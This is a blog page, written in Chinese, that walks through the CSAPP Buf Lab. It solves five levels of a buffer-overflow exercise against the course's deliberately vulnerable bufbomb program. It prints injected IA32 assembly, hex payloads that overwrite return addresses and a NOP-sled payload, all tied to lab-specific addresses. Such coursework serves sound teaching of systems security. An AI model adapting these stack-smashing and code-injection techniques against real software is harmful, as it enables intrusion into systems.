@@ -1,0 +1,445 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>CSAPP: Buf Lab - </title>
+  <meta name="author" content="Jiashun Zhu">
+
+  
+  <meta name="description" content="这是CSAPP的buflab，非常有意思，难度又比之前的bomb-lab要小很多。程序有一个命令行选项-u要求我们输入一个唯一的userid，根据不同的userid生成不同的cookie值，这个cookie值之后在程序里一直会用到，所以每个人的答案应该都会不同。我用的userid是zjs。 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://zyearn.com/blog/2014/02/07/csapp-buf-lab">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css" />
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script>
+</script>
+
+
+  
+
+</head>
+
+<body   >
+  <header style="padding: 0"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:zyearn.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">所有文章</a></li>
+  <li><a href="/about">关于我</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">CSAPP: Buf Lab</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-02-07T23:30:00+01:00" pubdate data-updated="true"></time>
+      </p>
+    
+  </header>
+
+
+<div class="entry-content">
+    <p>这是CSAPP的buflab，非常有意思，难度又比之前的bomb-lab要小很多。程序有一个命令行选项-u要求我们输入一个唯一的userid，根据不同的userid生成不同的cookie值，这个cookie值之后在程序里一直会用到，所以每个人的答案应该都会不同。我用的userid是<code>zjs</code>。</p>
+
+<!-- more -->
+
+
+<p>这个lab要我们做这样一件事情，修改一个正在运行程序的stack以达到预期的目的。具体的修改方式是这样的：程序定义了一个局部C风格字符串变量，注意局部变量是放在stack上面的，所以当初始化这个字符串为用户输入，而又没有边界检查的话，就会缓冲区溢出，那么就会破坏这个函数栈。</p>
+
+<p>就像下面这个函数会破坏自己的函数栈：</p>
+
+<pre><code>#define NORMAL_BUFF_SIZE 32
+
+int getbuf()
+{
+    char buf[NORMAL_BUFF_SIZE];
+    Gets(buf);
+    return 1;
+}
+</code></pre>
+
+<p>会破坏到什么程度呢？如果用户输入太大，那么就把<code>saved ebp</code>给覆盖掉了；再大一点，就把<code>return address</code>覆盖掉了&hellip;没错，这个lab的精髓就是要让我们的输入来覆盖<code>return address</code>达到return到代码的其它地方执行。</p>
+
+<h2>Some Tools</h2>
+
+<p>在做这个实验的时候，需要了解以下一些命令：</p>
+
+<ol>
+<li>objdump -d xxx //反汇编</li>
+<li>gcc -m32 -c xxx.s   //将汇编文件xxx.s生成IA32的relocatable object file，再用反汇编就知道xxx.s中汇编代码的二进制编码</li>
+</ol>
+
+
+<h2>第0关：smoke</h2>
+
+<p>我们的目标是调用上面的<code>getbuf</code>以后，不正常返回，而是跳掉smoke这个函数的地方执行。</p>
+
+<p>很简单，就是先填充掉32字节本身的变量空间，然后4个字节重写掉<code>saved ebp</code>，再用4个字节重写掉<code>return address</code>，需要把<code>return address</code>替换为smoke的函数起始地址。我这里看到的smoke起始地址是<code>0x8048d83</code>，编码用的是小端规则，所以答案是：</p>
+
+<pre><code>00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 83 8d 04 08
+</code></pre>
+
+<p>需要注意的是，这里覆盖掉了<code>saved ebp</code>，所以离开程序smoke以后<code>ebp</code>就错了，好在smoke直接调exit了，所以暂时不需要考虑这个问题。</p>
+
+<p>实验还提供了一个工具把上面的二进制答案转化为程序输入的字节流，所以完整的命令行是：</p>
+
+<pre><code>cat answer0 | ./hex2raw | ./bufbomb -u zjs
+</code></pre>
+
+<h2>第1关：Sparkler</h2>
+
+<p>这一关和第0关类似，最大的区别是这次要跳到<code>fizz</code>这个函数有个参数，我们在输入里需要伪造出函数的参数。
+代码里有两句是：</p>
+
+<pre><code>mov 0x8(%ebp),%eax
+cmp 0x804c1e4,%eax
+</code></pre>
+
+<p>其中<code>0x8(%ebp)</code>就是函数的第一个参数，而<code>0x804c1e4</code>这个内存地址保存着cookie的值（通过阅读课程给的pdf中的伪代码推断出），然后这两个值期望是一样的，我们要做的就是伪造出一个函数参数，使它等于cookie值。所以只需在第一题的基础上，后面加4个字节0（伪造return address，这个值的大小无所谓，但必须占着空间），紧接着后面加上参数，即cookie的值即可。这一关答案为：</p>
+
+<pre><code>00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 38 8d 04 08
+00 00 00 00 /* fake return address */
+d4 9f c2 50 /* the result of ./makecookie &lt;yourname&gt; */
+</code></pre>
+
+<h2>第2关：Firecracker</h2>
+
+<p>这关比较有意思，在bang这个函数中，程序需要<code>0x804c1e4</code>和<code>0x804c1ec</code>存的值相同。<code>0x804c1e4</code>存的是cookie。</p>
+
+<p>我们需要做的，是自己写一段代码，给<code>0x804c1ec</code>内存地址赋值，然后让程序跳转到我们写的代码处执行。怎么让程序跳转到我们嵌入的汇编代码？既然可以修改<code>return address</code>，那就让它跳到局部字符串的首地址，而局部字符串里存的就是我们的指令代码。</p>
+
+<p>现在剩下的问题就是，编写攻击的汇编代码，然后把它转成二进制格式，作为bufbomb的输入。</p>
+
+<p>第一步很简单，需要编写下面的代码Firecracker.s</p>
+
+<pre><code>mov 0x804c1e4,%eax
+mov %eax,0x804c1ec  // *(0x804c1ec) = *(0x804c1e4)
+push $0x8048ceb     // function bang's address
+ret
+</code></pre>
+
+<p>第二步需要得到它对应的IA32二进制汇编代码，对它进行汇编：</p>
+
+<pre><code>gcc -m32 -c Firecracker.s
+</code></pre>
+
+<p>生成Firecracker.o文件，然后反汇编生成二进制代码：</p>
+
+<pre><code>objdump -d Firecracker.o
+</code></pre>
+
+<p>之后把这些代码复制到我们的答案里就可以了。最后需要把<code>return address</code>改为字符串的起始地址，虽然书里提到stack randomization的方法来防止bufferoverflow攻击，但这里提供的bufbomb似乎不支持，所以给我们的攻击提供了可能。在getbuf这个函数里打好断点，用gdb命令<code>p $ebp - 0x20</code>就可以查到字符串起始地址，在我这里是<code>0x556836e0</code>。</p>
+
+<p>这一关的答案为</p>
+
+<pre><code>
+a1 e4 c1 04 08  /* mov */
+a3 ec c1 04 08  /* mov */
+68 eb 8c 04 08  /* push jmp address*/
+c3              /* ret */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 e0 36 68 55 /* using 0 and $ebp - 0x20 replace ebp and return address*/
+</code></pre>
+
+
+<h2>第3关：Dynamite</h2>
+
+<p>和上一关类似，区别在这一关在嵌入攻击汇编代码后，不是跳转到任意一个函数，而是跳转回callee（就是test函数），其实这和跳转到bang没有任何区别。题目还有一个额外的要求，让getbuf返回cookie值给test而不是原本的1。寄存器%eax是用来传递返回值的，所以只需要在攻击代码里把cookie值mov到这个寄存器即可。还有一个问题，return address怎么得到，有两个方法，第一个方法，在test函数调用getbuf的下一条指令地址就是getbuf返回的地址；第二个方法，用gdb断点打在getbuf，打印出%ebp + 4这个地址的值就是return address。</p>
+
+<p>所以攻击代码是这样的：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>movl 0x804d108, %eax    /* cookie存在地址0x804d108里 */
+</span><span class='line'>pushl $0x08048dbe       /* 返回地址 */
+</span><span class='line'>ret</span></code></pre></td></tr></table></div></figure>
+
+
+<p>运行一下发现程序段错误了。用gdb单步调试发现这个段错误发生在从getbuf返回后，执行<code>mov -0xc(%ebp),%edx</code>。突然意识到，在攻击的时候把%ebp给覆盖掉了，所以此时的%ebp是0，当然会发生非法地址访问。于是在我们的攻击代码里需要恢复%ebp的值，这个值也可以从gdb中打印看出。</p>
+
+<p>所以攻击代码应该是这样的：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>movl 0x804d108, %eax
+</span><span class='line'>movl $0x556838b0, %ebp
+</span><span class='line'>pushl $0x08048dbe
+</span><span class='line'>ret</span></code></pre></td></tr></table></div></figure>
+
+
+<p>到这里，我们可以思考一下，我们究竟干了什么。我们让一个程序执行了我们自己设计的代码并且程序毫不知情！</p>
+
+<h2>第4关：Nitroglycerin</h2>
+
+<p>这一关难度比前面都大。进入这一关需要加入-n选项，调的函数是testn和getbufn，而不是前面的test和getbuf。前面所有函数调用的栈地址都是固定的，静态的。在这一关栈的地址将不固定，也就是说不能准确地跳转到栈空间的某个特定地址，因为我们不知道局部变量的初始化地址在哪。这道题有5个test case，要都通过才算过，不能写死跳转地址了。</p>
+
+<p>在这一关buffersize也从32增大到了512，这个做法是有意义的。大概的思路是，虽然栈的初始地址不同，但会在一些范围里浮动，所以我们需要把我们的代码填在512字节的最后几个字节里，并且前面全面的空间都填上nop(编码为<code>0x90</code>)。不管我们跳转到哪个nop，最后都会执行到我们的代码。用gdb观察5个case分别的<code>ebp - 0x200</code>的值，我们取最大的值作为跳转地址。
+在我这里最大的地址是<code>0x55683570</code>。</p>
+
+<p>因为要执行5遍，所以我们必须考虑覆盖<code>saved ebp</code>这个问题，否则程序不能正确运行。查看testn的ebp值和getbufn的ebp值，发现它们的差值总是<code>0x30</code>，所以当我们返回testn的时候，$esp+0x28 就应该是此时ebp正确的值。</p>
+
+<p>所以我们的汇编代码为：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>lea 0x28(%esp), %ebp
+</span><span class='line'>mov 0x804c1e4, %eax
+</span><span class='line'>push $0x8048c93     /* 返回到testn的地址 */
+</span><span class='line'>ret</span></code></pre></td></tr></table></div></figure>
+
+
+<p>第二行代码的目的是因为跳转到<code>0x8048c93</code>后，eax的值需要和cookie比较，相等才能通过。</p>
+
+<p>所以答案为：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+</span><span class='line'>90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24 28
+</span><span class='line'>a1 e4 c1 04 08 68 93 8c 04 08 c3 90 90 90 90 90
+</span><span class='line'>00 00 00 00 70 35 68 55 </span></code></pre></td></tr></table></div></figure>
+
+
+<p>注意最后一行最后4个字节为跳转地址，这个地址需要计算得出，并且cookie不同这个值也不同。</p>
+
+<p>这一关的运行代码为：</p>
+
+<pre><code>cat answer4 | ./hex2raw -n | ./bufbomb -u zjs -n
+</code></pre>
+
+<p>至此，5个level的buffer overflow攻击就全完成了。</p>
+
+    欢迎关注微信公众号<br>
+    <img src="/images/qrcode.jpeg" alt="qrcode">
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Jiashun Zhu</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-02-07T23:30:00+01:00" pubdate data-updated="true"></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/computersystem/'>computersystem</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/02/03/csapp-bomb-lab/" title="Previous Post: CSAPP: bomb lab">&laquo; CSAPP: bomb lab</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/02/16/csapp-cache-lab/" title="Next Post: CSAPP: Cache Lab">CSAPP: Cache Lab &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+  <section>
+  <!-- <h1>Comments</h1> -->
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+
+</div>
+
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Categories</h1>
+    <ul id="category-list"><li><a href='/blog/categories/algorithms'>algorithms (2)</a></li><li><a href='/blog/categories/brpc'>brpc (1)</a></li><li><a href='/blog/categories/computersystem'>computersystem (7)</a></li><li><a href='/blog/categories/life'>life (2)</a></li><li><a href='/blog/categories/program'>program (17)</a></li><li><a href='/blog/categories/psychology'>psychology (1)</a></li><li><a href='/blog/categories/reading'>reading (3)</a></li><li><a href='/blog/categories/thoughts'>thoughts (7)</a></li></ul>
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+<script type="text/javascript" src="https://s4.cnzz.com/z_stat.php?id=1277859960&web_id=1277859960"></script> Copyright &copy; 2021 - Jiashun Zhu -
+</p>
+
+</footer>
+  
+  <script src="http://cdn.staticfile.org/jquery/2.0.0/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'zyearnsblog';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://zyearn.com/blog/2014/02/07/csapp-buf-lab/';
+        var disqus_url = 'http://zyearn.com/blog/2014/02/07/csapp-buf-lab/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+</html>
